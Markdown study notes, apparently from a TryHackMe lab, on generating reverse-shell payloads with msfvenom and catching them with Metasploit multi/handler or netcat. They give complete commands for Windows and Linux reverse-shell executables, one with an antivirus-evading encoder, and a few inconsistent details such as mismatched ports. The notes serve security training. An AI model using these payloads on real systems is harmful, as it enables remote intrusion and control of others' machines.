# MSFVENOM

- OneStop shop for all things payload.
- It is used in lower-level exploit development to generate hexadecimal shellcode when developing something like Buffer Overflow exploit.
- It can also be used to generate payloads in different formats. .exe, .py, .war, .aspx etc., to name a few
- the standard syntax is `msfvenom -p <payload> <options>`
- for example to generate a windows x64 reverse shell in an exe format, we could use
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<host-ip> LPORT=<listen-port>`
LHOST specifies the IP to connect back to
LPORT specifies the listening port on the attackers machine

## staged vs stageless reverse shell payloads

- *Staged* payloads are sent in two parts. The first part is called a Stager. This piece of code executes on the server itself.
- It connects back to a waiting listener
- It relies on the listener to load the real payload, executing directly, and preventing it from touching the disk where it could be caught by anti-virus solutions.
- thus the payload is split into two parts. 
- a small initial stager and then the bulkier reverse shell code which is downloaded when the stager is activated. staged payload requires a special listener usually the *Metasploit multi/handler*.
- staged payloads are hard to use
- modern day anti-virus solutions will also make use of AMSI (Anti-Malware scan interface) to detect the payload as it is loaded into the memory by the stager, making staged payloads less effective than they would have been once in this area.

- stageless payloads are much common, these are what we have been using till now. they are entirely self-contained which when executed returns back a shell to the waiting listener on the attacker's machine.- stageless payloads are easier to use and catch
- they are bulkier and easy for an anti-virus scan to catch 
- they are easy to be detected by an IDS and be thrown off or removed from.

## meterpreter

- this is metasploits own version of full featured shell.
- they are completely stable and it is good to work with them when we are trying to exploit windows targets.
- they have functionality such as file uploads and file downloads.
- if we want to use metasploits post-exploitation tools then we need to use meterpreter shell.
- downside: they are banned from use in certain certification examinations hence you need to learn alternatives.

## payload naming conventions

- the basic naming convention is `<os>/<arch>/<payload>`
- for example:- `linux/x86/shell_reverse_tcp`, this would generate a stageless reverse shell for an x86linux target.
- the exception to these convention is windows 32 bit targets. for these things the arch is not specified. `windows/shell_reverse_tcp`
- for windows 64 bit the arch will be specified. `windows/x64/shell_reverse_tcp`
- stageless payloads are denoted with `_` underscores.
- the staged payload must have been `reverse/shell/payload`.
- this rule also applies to meterpreter payloads. a windows 64 bit staged meterpreter payload would look like this. `windows/x64/meterpreter/reverse_tcp`
- linux 32 bit stageless meterpreter payloads look like `linux/x86/meterpreter_reverse_tcp`
- one of the useful commands is
- `msfvenom --list payloads`

## Sample Questions
- Generate a staged reverse shell for a 64 bit Windows target, in a .exe format using your TryHackMe tun0 IP address and a chosen port.
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=10.10.128.123 LPORT=443`

- What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell ?
`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`

- meterpreter reverse shell for a x86 windows machine
`msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.18.112.115 LPORT=3333 -f exe -o reverse.exe`

## multi/handler
- launch msfconsole
- use multi/handler
- options
- we need to set three options, PAYLOAD, LHOST, LPORT
- these are all identical options when we are trying to generate shell code with msfvenom
- payload - payload specific to the target
- LHOST/LPORT - is where we receive the shell
- metasploit will not listen on all interfaces like socat and netcat
- it must be told to listen to on a specific surface.
- `set payload <payload>`
- `set LHOST <host>`
- `set LPORT <port>`
- we should be able to start the listener with the command `exploit -j`
- this will metasploit to launch the module, running as a job in the background.
- to start a listener in the background it is `exploit -j`
- to a specific reverse shell session it is `sessions <session_num>`

## examples using msfvenom:-
1.
generate an msfvenom payload with the following command
`msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.18.115.112 LPORT=3333`

copy the shell.exe and launch the msfconsole.

```
msfconsole
use multi/handler
options
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.18.115.112 
set LPORT 4444
run or exploit -j
sessions <session_number>
```

with msfconsole you can catch a meterpreter shell.

2.

creating a stageless shell is as follows
`msfvenom -p windows/x64/shell_reverse_tcp -f exe -o stageless_shell.exe LHOST=10.18.115.112 LPORT=33`

And can you catch it with netcat. You can catch stageless shells with netcat.
`nc -lnvp 33` and yes can.

3.

How about staged shells ?
creating a staged shell is as follows
`msfvenom -p windows/x64/shell/reverse_tcp -f exe -o staged_shell.exe LHOST=10.118.115.112  LPORT=312`

can you catch it with netcat ?
